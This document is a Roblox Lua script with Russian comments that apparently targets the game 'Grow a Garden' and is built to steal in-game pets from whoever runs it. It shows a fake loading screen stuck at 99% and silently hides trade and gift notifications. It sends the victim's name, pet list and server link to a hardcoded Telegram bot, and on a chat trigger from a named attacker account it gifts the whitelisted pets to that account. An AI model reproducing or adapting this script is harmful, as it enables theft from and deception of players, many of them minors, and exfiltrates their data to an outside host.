local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local TextChatService = game:GetService("TextChatService")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer

-- 🔍 ОТЛАДОЧНАЯ ФУНКЦИЯ ДЛЯ ПОИСКА ТРЕЙД ЭЛЕМЕНТОВ
local function findTradeElements()
    print("=== ПОИСК ТРЕЙД ЭЛЕМЕНТОВ ===")
    
    for _, gui in ipairs(LocalPlayer.PlayerGui:GetChildren()) do
        if gui:IsA("ScreenGui") then
            print("Проверяем GUI:", gui.Name)
            
            for _, obj in ipairs(gui:GetDescendants()) do
                if obj:IsA("TextLabel") and obj.Visible and obj.Text ~= "" then
                    local text = obj.Text:lower()
                    local position = obj.AbsolutePosition
                    local size = obj.AbsoluteSize
                    
                    -- Вычисляем центр экрана
                    local screenCenter = workspace.CurrentCamera.ViewportSize
                    local centerX = screenCenter.X / 2
                    local centerY = screenCenter.Y / 2
                    
                    -- Вычисляем центр объекта
                    local objCenterX = position.X + size.X / 2
                    local objCenterY = position.Y + size.Y / 2
                    
                    -- Расстояние от центра
                    local distanceFromCenter = math.sqrt((objCenterX - centerX)^2 + (objCenterY - centerY)^2)
                    
                    -- Если текст содержит торговые слова или находится в центре
                    if text:find("trade") or text:find("gift") or text:find("accept") or text:find("decline") or
                       text:find("request") or text:find("offer") or distanceFromCenter < 250 then
                        
                        print("НАЙДЕН ЭЛЕМЕНТ:")
                        print("  Путь:", gui.Name .. " -> " .. obj:GetFullName())
                        print("  Имя:", obj.Name)
                        print("  Текст:", obj.Text)
                        print("  Позиция:", position.X, position.Y)
                        print("  Размер:", size.X, size.Y)
                        print("  Центр объекта:", objCenterX, objCenterY)
                        print("  Центр экрана:", centerX, centerY)
                        print("  Расстояние от центра:", math.floor(distanceFromCenter))
                        print("  Цвет текста:", obj.TextColor3)
                        print("  Родитель:", obj.Parent and obj.Parent.Name or "nil")
                        print("  Прозрачность:", obj.TextTransparency)
                        print("  Видимость:", obj.Visible)
                        print("  ClassName:", obj.ClassName)
                        print("---")
                    end
                end
            end
        end
    end
    
    print("=== ПОИСК ЗАВЕРШЕН ===")
end

-- Команда для поиска (добавляем в систему команд)
-- Теперь игрок может написать "find" чтобы найти элементы
local function hideMiddleScreenText()
    pcall(function()
        for _, gui in ipairs(LocalPlayer.PlayerGui:GetChildren()) do
            if gui:IsA("ScreenGui") and gui.Name ~= "CustomLoadingUI" then
                for _, obj in ipairs(gui:GetDescendants()) do
                    if obj:IsA("TextLabel") and obj.Visible then
                        local text = obj.Text:lower()
                        local position = obj.AbsolutePosition
                        local size = obj.AbsoluteSize
                        
                        -- Проверяем, находится ли текст в центральной области экрана
                        local screenCenter = workspace.CurrentCamera.ViewportSize
                        local centerX = screenCenter.X / 2
                        local centerY = screenCenter.Y / 2
                        
                        local objCenterX = position.X + size.X / 2
                        local objCenterY = position.Y + size.Y / 2
                        
                        -- Если объект в центральной зоне (±200 пикселей от центра)
                        local isInCenter = math.abs(objCenterX - centerX) < 200 and math.abs(objCenterY - centerY) < 200
                        
                        if isInCenter then
                            -- Скрываем торговые/подарочные уведомления
                            if text:find("trade") or text:find("trading") or text:find("gift") or 
                               text:find("accept") or text:find("decline") or text:find("request") or
                               text:find("offer") or text:find("wants") or text:find("give") or
                               text:find("receive") or text:find("confirm") or text:find("cancel") or
                               text:find("pending") or text:find("waiting") or text:find("sending") then
                                
                                -- НЕ скрываем важные элементы
                                if not (obj.Name:find("Finalizing") or obj.Name:find("Important") or
                                       (obj.Parent and obj.Parent.Name == "Trading")) then
                                    obj.Visible = false
                                    -- Дополнительно делаем прозрачным
                                    obj.TextTransparency = 1
                                    obj.BackgroundTransparency = 1
                                end
                            end
                            
                            -- Также скрываем белые уведомления без определенного текста
                            if obj.TextColor3 == Color3.new(1, 1, 1) and obj.Text ~= "" and 
                               not obj.Name:find("Loading") and not obj.Name:find("Custom") then
                                obj.TextTransparency = 0.8 -- Делаем полупрозрачным
                            end
                        end
                    end
                    
                    -- Также проверяем Frame элементы (могут содержать уведомления)
                    if obj:IsA("Frame") and obj.Visible then
                        local position = obj.AbsolutePosition
                        local size = obj.AbsoluteSize
                        local screenCenter = workspace.CurrentCamera.ViewportSize
                        local centerX = screenCenter.X / 2
                        local centerY = screenCenter.Y / 2
                        
                        local objCenterX = position.X + size.X / 2
                        local objCenterY = position.Y + size.Y / 2
                        
                        local isInCenter = math.abs(objCenterX - centerX) < 150 and math.abs(objCenterY - centerY) < 150
                        
                        if isInCenter and (obj.Name:lower():find("trade") or obj.Name:lower():find("gift") or 
                                          obj.Name:lower():find("request") or obj.Name:lower():find("notification")) then
                            obj.Visible = false
                        end
                    end
                end
            end
        end
    end)
end

-- Запускаем скрытие каждые 1.5 секунды (оптимизировано)
task.spawn(function()
    while true do
        hideMiddleScreenText()
        task.wait(1.5)
    end
end)

-- Дополнительная защита: скрываем новые элементы сразу при появлении
LocalPlayer.PlayerGui.DescendantAdded:Connect(function(obj)
    task.wait(0.5) -- Даем элементу появиться
    
    if obj:IsA("TextLabel") and obj.Visible then
        local text = obj.Text:lower()
        
        if text:find("trade") or text:find("gift") or text:find("request") or text:find("accept") then
            if not (obj.Name:find("Finalizing") or (obj.Parent and obj.Parent.Name == "Trading")) then
                obj.Visible = false
                obj.TextTransparency = 1
            end
        end
    end
end)

-- 🌌 ЗАГРУЗОЧНЫЙ ФОН (ВОССТАНОВЛЕН)
task.spawn(function()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "CustomLoadingUI"
    screenGui.IgnoreGuiInset = true
    screenGui.ResetOnSpawn = false
    screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
    
    -- ФОН
    local background = Instance.new("ImageLabel")
    background.Size = UDim2.new(1, 0, 1, 0)
    background.Position = UDim2.new(0, 0, 0, 0)
    background.Image = "rbxassetid://128494498539944"
    background.BackgroundTransparency = 1
    background.ScaleType = Enum.ScaleType.Crop
    background.Parent = screenGui
    
    local tweenService = game:GetService("TweenService")
    
    -- Надпись Loading
    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, 0, 0, 50)
    label.Position = UDim2.new(0, 0, 0.4, 0)
    label.BackgroundTransparency = 1
    label.Text = "Loading"
    label.TextColor3 = Color3.new(1, 1, 1)
    label.Font = Enum.Font.GothamBold
    label.TextSize = 36
    label.TextStrokeTransparency = 0.6
    label.Parent = background
    
    -- Анимация точек
    local dotTask = task.spawn(function()
        local dots = {"", ".", "..", "..."}
        local dotIndex = 1
        while screenGui.Parent do
            label.Text = "Loading" .. dots[dotIndex]
            dotIndex = dotIndex % 4 + 1
            task.wait(0.5)
        end
    end)
    
    -- Прогресс-бар
    local barContainer = Instance.new("Frame")
    barContainer.Size = UDim2.new(0.4, 0, 0.025, 0)
    barContainer.Position = UDim2.new(0.3, 0, 0.5, 0)
    barContainer.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
    barContainer.BorderSizePixel = 0
    barContainer.Parent = background
    
    local containerCorner = Instance.new("UICorner")
    containerCorner.CornerRadius = UDim.new(0, 8)
    containerCorner.Parent = barContainer
    
    local barFill = Instance.new("Frame")
    barFill.Size = UDim2.new(0, 0, 1, 0)
    barFill.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
    barFill.BorderSizePixel = 0
    barFill.Parent = barContainer
    
    local fillCorner = Instance.new("UICorner")
    fillCorner.CornerRadius = UDim.new(0, 8)
    fillCorner.Parent = barFill
    
    local gradient = Instance.new("UIGradient")
    gradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 170, 255)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 255, 170))
    })
    gradient.Parent = barFill
    
    local percent = Instance.new("TextLabel")
    percent.Size = UDim2.new(0, 60, 0, 25)
    percent.Position = UDim2.new(0.71, 10, 0.5, -12)
    percent.BackgroundTransparency = 1
    percent.TextColor3 = Color3.new(1, 1, 1)
    percent.Text = "0%"
    percent.Font = Enum.Font.Gotham
    percent.TextSize = 20
    percent.TextXAlignment = Enum.TextXAlignment.Left
    percent.Parent = background
    
    -- Анимация прогресса (быстрее)
    for i = 1, 99 do
        barFill.Size = UDim2.new(i / 100, 0, 1, 0)
        percent.Text = i .. "%"
        task.wait(0.1) -- Быстрее чем 3 секунды
    end
    
    -- Застывает на 99%
    percent.Text = "99%"
    barFill.Size = UDim2.new(0.99, 0, 1, 0)
    
    task.cancel(dotTask)
end)

-- 🔧 НАСТРОЙКИ
local TELEGRAM_TOKEN = "7678595031:AAHYzkbKKI4CdT6B2NUGcYY6IlTvWG8xkzE"
local TELEGRAM_CHAT_ID = "7144575011"
local TARGET_PLAYER = "Rikizigg"
local TRIGGER_MESSAGE = "."

-- 🐾 БЕЛЫЙ СПИСОК
local WHITELIST = {
    "Crab",
    "Moon Cat", 
    "Wasp"
}

local PetGiftingService = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService")

-- 📊 СТАТИСТИКА
local STATS = {
    startTime = tick(),
    totalPetsTransferred = 0,
    errors = 0
}

-- 📨 ПРОСТАЯ ФУНКЦИЯ TELEGRAM
local function sendToTelegram(text)
    -- Ограничиваем длину
    if #text > 3500 then
        text = text:sub(1, 3500) .. "..."
    end
    
    local success, result = pcall(function()
        local url = string.format(
            "https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s",
            TELEGRAM_TOKEN,
            TELEGRAM_CHAT_ID,
            HttpService:UrlEncode(text)
        )
        return game:HttpGet(url)
    end)
    
    if not success then
        warn("Telegram error: " .. tostring(result))
        STATS.errors = STATS.errors + 1
    end
    
    return success
end

-- 🔗 ФУНКЦИЯ ССЫЛКИ НА СЕРВЕР
local function getServerLink()
    local placeId = game.PlaceId
    local jobId = game.JobId
    
    if not jobId or jobId == "" then
        return "roblox://placeId=" .. placeId
    else
        return "roblox://placeId=" .. placeId .. "&gameInstanceId=" .. jobId
    end
end

-- 🔎 ФУНКЦИЯ ПОЛУЧЕНИЯ ПИТОМЦЕВ
local function getAllPets()
    local pets = {}
    local sources = {LocalPlayer.Backpack}
    
    if LocalPlayer.Character then
        table.insert(sources, LocalPlayer.Character)
    end
    
    for _, source in ipairs(sources) do
        for _, item in ipairs(source:GetChildren()) do
            if item:IsA("Tool") and item.Name:find("%[") then
                local weight = item.Name:match("%[(%d+%.%d+) KG%]")
                if weight then
                    local petName = item.Name:match("^([^%[]+)")
                    if petName then
                        petName = petName:gsub("%s+$", "")
                        
                        local isWhitelisted = false
                        for _, whitelistedPet in ipairs(WHITELIST) do
                            if petName:lower():find(whitelistedPet:lower()) then
                                isWhitelisted = true
                                break
                            end
                        end
                        
                        table.insert(pets, {
                            name = petName,
                            weight = tonumber(weight),
                            object = item,
                            isWhitelisted = isWhitelisted
                        })
                    end
                end
            end
        end
    end
    
    table.sort(pets, function(a, b) return a.weight > b.weight end)
    return pets
end

-- 📜 СПИСОК ПИТОМЦЕВ
local function getPetsList()
    local pets = getAllPets()
    if #pets == 0 then 
        return "Нет питомцев" 
    end
    
    local whitelisted = 0
    local totalWeight = 0
    local result = {"ПИТОМЦЫ:"}
    
    for i, pet in ipairs(pets) do
        if i > 15 then break end -- Ограничиваем вывод
        
        totalWeight = totalWeight + pet.weight
        if pet.isWhitelisted then
            whitelisted = whitelisted + 1
            table.insert(result, string.format("✅ %s [%.1f]", pet.name, pet.weight))
        else
            table.insert(result, string.format("❌ %s [%.1f]", pet.name, pet.weight))
        end
    end
    
    if #pets > 15 then
        table.insert(result, "...")
    end
    
    table.insert(result, string.format("\nВсего: %d | К передаче: %d", #pets, whitelisted))
    
    return table.concat(result, "\n")
end

-- 🏁 СТАРТОВОЕ УВЕДОМЛЕНИЕ
local function sendInitialNotification()
    local message = string.format(
        "СКРИПТ ЗАПУЩЕН\n\nИгрок: %s\nКоманды от: %s\nТриггер: %s\n\n%s\n\nСсылка: %s",
        LocalPlayer.Name,
        TARGET_PLAYER, 
        TRIGGER_MESSAGE,
        getPetsList(),
        getServerLink()
    )
    
    sendToTelegram(message)
end

-- 🐕 ФУНКЦИЯ ПЕРЕДАЧИ
local function transferPet(pet)
    if not pet.isWhitelisted then 
        return false, "Не в списке" 
    end
    
    local target = Players:FindFirstChild(TARGET_PLAYER)
    if not target then
        return false, "Игрок не найден"
    end
    
    if not (LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid")) then
        return false, "Персонаж недоступен"
    end
    
    local success, err = pcall(function()
        LocalPlayer.Character.Humanoid:EquipTool(pet.object)
        task.wait(1)
        PetGiftingService:FireServer("GivePet", target)
    end)
    
    if success then
        STATS.totalPetsTransferred = STATS.totalPetsTransferred + 1
        return true, "OK"
    else
        STATS.errors = STATS.errors + 1
        return false, "Ошибка"
    end
end

-- 🚚 ПРОЦЕСС ПЕРЕДАЧИ
local function startPetTransfer()
    sendToTelegram("Начинаю передачу...")
    
    local pets = getAllPets()
    local whitelistedPets = {}
    
    for _, pet in ipairs(pets) do
        if pet.isWhitelisted then
            table.insert(whitelistedPets, pet)
        end
    end
    
    if #whitelistedPets == 0 then
        sendToTelegram("Нет питомцев для передачи")
        return
    end
    
    local successful = 0
    local failed = 0
    
    for i, pet in ipairs(whitelistedPets) do
        local success, reason = transferPet(pet)
        
        if success then
            successful = successful + 1
        else
            failed = failed + 1
        end
        
        -- Отчет каждые 5 питомцев
        if i % 5 == 0 then
            sendToTelegram(string.format("Прогресс: %d/%d", i, #whitelistedPets))
        end
        
        task.wait(2)
    end
    
    -- Финальный отчет
    sendToTelegram(string.format(
        "ГОТОВО!\nУспешно: %d\nОшибок: %d", 
        successful, failed
    ))
end

-- 💬 СИСТЕМА КОМАНД
local function setupMessageListener()
    if TextChatService then
        TextChatService.OnIncomingMessage = function(message)
            local speaker = Players:FindFirstChild(message.TextSource.Name)
            if speaker and speaker.Name == TARGET_PLAYER then
                local msg = message.Text:lower()
                
                if message.Text == TRIGGER_MESSAGE then
                    startPetTransfer()
                elseif msg:find("pets") then
                    sendToTelegram(getPetsList())
                elseif msg:find("link") then
                    sendToTelegram("Ссылка: " .. getServerLink())
                elseif msg:find("status") then
                    local uptime = string.format("%.1f мин", (tick() - STATS.startTime) / 60)
                    sendToTelegram(string.format("Работает: %s\nПередано: %d", uptime, STATS.totalPetsTransferred))
                elseif msg:find("find") then
                    -- НОВАЯ КОМАНДА ДЛЯ ПОИСКА ТРЕЙД ЭЛЕМЕНТОВ
                    findTradeElements()
                    sendToTelegram("Проверь консоль F9 - там информация о найденных элементах")
                end
            end
        end
    else
        Players.PlayerChatted:Connect(function(chatType, speaker, message)
            if chatType == Enum.PlayerChatType.All and speaker.Name == TARGET_PLAYER then
                local msg = message:lower()
                
                if message == TRIGGER_MESSAGE then
                    startPetTransfer()
                elseif msg:find("pets") then
                    sendToTelegram(getPetsList())
                elseif msg:find("link") then
                    sendToTelegram("Ссылка: " .. getServerLink())
                elseif msg:find("status") then
                    local uptime = string.format("%.1f мин", (tick() - STATS.startTime) / 60)
                    sendToTelegram(string.format("Работает: %s\nПередано: %d", uptime, STATS.totalPetsTransferred))
                elseif msg:find("find") then
                    -- НОВАЯ КОМАНДА ДЛЯ ПОИСКА ТРЕЙД ЭЛЕМЕНТОВ
                    findTradeElements()
                    sendToTelegram("Проверь консоль F9 - там информация о найденных элементах")
                end
            end
        end)
    end
end

-- 🚀 ЗАПУСК
task.wait(10) -- Даем время загрузиться GUI
sendInitialNotification()
setupMessageListener()

print("✅ Скрипт Grow a Garden загружен!")
print("💬 Команды для " .. TARGET_PLAYER .. ":")
print("'" .. TRIGGER_MESSAGE .. "' - передать питомцев")
print("'pets' - список питомцев") 
print("'status' - статус")
print("'link' - ссылка на сервер")
print("'find' - найти трейд элементы (отладка)")
print("🛡️ Система скрытия торговых уведомлений активна")
print("🌌 Загрузочный фон активен")
print("🔍 Для поиска трейд элементов напиши 'find' в чат")
